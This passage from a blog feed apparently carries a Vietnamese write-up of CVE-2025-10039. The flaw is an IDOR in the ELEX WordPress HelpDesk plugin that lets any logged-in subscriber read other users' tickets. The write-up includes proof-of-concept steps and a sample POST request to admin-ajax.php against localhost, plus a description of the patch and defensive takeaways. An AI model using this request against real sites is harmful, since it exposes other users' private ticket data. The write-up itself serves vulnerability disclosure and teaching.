2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Authenticated User (Subcriber&amp;#43;)&amp;#34;] &#xA;--&amp;gt; B[&amp;#34;Request admin-ajax.php?action=eh_crm_ticket_single_view_client&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Verify nonce&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;Get ticket_id from request&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Load ticket by ticket_id&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;No ownership check&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;No role validation&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;Return full ticket data&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;User can view other users&amp;#39; tickets (IDOR)&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Login v·ªõi Subcriber+ user:&lt;/li&gt;&#xA;&lt;li&gt;Submit 1 ticket b·∫•t k√¨&lt;/li&gt;&#xA;&lt;li&gt;T·∫°i b·∫£ng &lt;code&gt;Your Tickets&lt;/code&gt;, l·∫•y &lt;code&gt;nonce&lt;/code&gt; b·∫±ng c√°ch view source:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-28-cve-2025-10039/nonce.png&#34; title=&#34;L·∫•y nonce&#34; data-thumbnail=&#34;/posts/2025-12-28-cve-2025-10039/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce&lt;/h2&gt;&lt;p&gt;L·∫•y nonce&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-28-cve-2025-10039/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;513&#34; width=&#34;1346&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;L·∫•y nonce&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;G·ª≠i request v·ªõi &lt;code&gt;nonce&lt;/code&gt; v·ª´a l·∫•y ƒë∆∞·ª£c&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: Subcriber&amp;#43; cookie&#xA;&#xA;action=eh_crm_ticket_single_view_client&amp;amp;nonce=4de88a7186&amp;amp;ticket_id=any_ticket_id &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-28-cve-2025-10039/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-28-cve-2025-10039/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-28-cve-2025-10039/result.png&#39; alt=&#34;Result&#34; height=&#34;910&#34; width=&#34;1555&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Th√¥ng tin tr·∫£ v·ªÅ ch·ª©a n·ªôi dung c·ªßa ticket v√† c·∫£ th√¥ng tin author c·ªßa ticket&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng x·∫£y ra do endpoint &lt;code&gt;eh_crm_ticket_single_view_client&lt;/code&gt; &lt;strong&gt;kh√¥ng ki·ªÉm tra quy·ªÅn s·ªü h·ªØu ticket&lt;/strong&gt;, ch·ªâ d·ª±a v√†o &lt;code&gt;ticket_id&lt;/code&gt; do ng∆∞·ªùi d√πng cung c·∫•p.&#xA;ƒêi·ªÅu n√†y cho ph√©p b·∫•t k·ª≥ ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p n√†o truy c·∫≠p ticket c·ªßa ng∆∞·ªùi kh√°c ‚Üí &lt;strong&gt;IDOR&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° kh·∫Øc ph·ª•c b·∫±ng c√°ch:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;So s√°nh &lt;code&gt;ticket_author&lt;/code&gt; v·ªõi &lt;code&gt;current_user_id&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Ch·ªâ cho ph√©p c√°c role ƒë∆∞·ª£c c·∫•p quy·ªÅn truy c·∫≠p&lt;/li&gt;&#xA;&lt;li&gt;T·ª´ ch·ªëi request n·∫øu kh√¥ng h·ª£p l·ªá tr∆∞·ªõc khi tr·∫£ d·ªØ li·ªáu&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;nonce&lt;/code&gt; &lt;strong&gt;kh√¥ng thay th·∫ø cho ki·ªÉm tra ph√¢n quy·ªÅn&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng ƒë∆∞·ª£c tin d·ªØ li·ªáu ID do client g·ª≠i l√™n&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n ki·ªÉm tra &lt;strong&gt;ownership&lt;/strong&gt; tr∆∞·ªõc khi truy xu·∫•t d·ªØ li·ªáu&lt;/li&gt;&#xA;&lt;li&gt;Authorization ph·∫£i ƒë∆∞·ª£c x·ª≠ l√Ω ·ªü backend, tr∆∞·ªõc khi tr·∫£ response&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/elex-helpdesk-customer-support-ticket-system/vulnerability/wordpress-elex-wordpress-helpdesk-customer-ticketing-system-plugin-3-2-9-authenticated-subscriber-insecure-direct-object-reference-via-eh-crm-ticket-single-view-client-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress ELEX WordPress HelpDesk &amp;amp; Customer Ticketing System Plugin &amp;lt;= 3.2.9 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
